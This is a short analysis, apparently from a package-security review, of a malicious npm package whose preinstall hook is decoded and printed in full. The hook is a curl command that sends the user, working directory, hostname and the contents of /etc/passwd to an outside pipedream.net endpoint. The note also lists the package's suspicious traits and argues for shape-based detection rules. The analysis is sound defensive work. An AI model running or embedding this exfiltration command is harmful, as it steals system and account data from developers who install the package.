Decoded: `curl https://eousft8gflamm91.m.pipedream.net -d "whoami=`whoami`&pwd=`pwd`&hostname=`hostname`&passwd=`cat /etc/passwd`"` at preinstall, before any user action. All corroborating tells present: description is the literal "description", main:"index.js" while index.js is ABSENT from the tarball (zero functionality), no repository or homepage, sentinel-high major on a name created today at 13:58:19Z, npm user forbugh <forbughunting7@protonmail.com> with the distinct author-field handle kp-admin. This is the value of graduating by SHAPE: a name-keyed rule would have missed it, since the name changed while the loader did not.
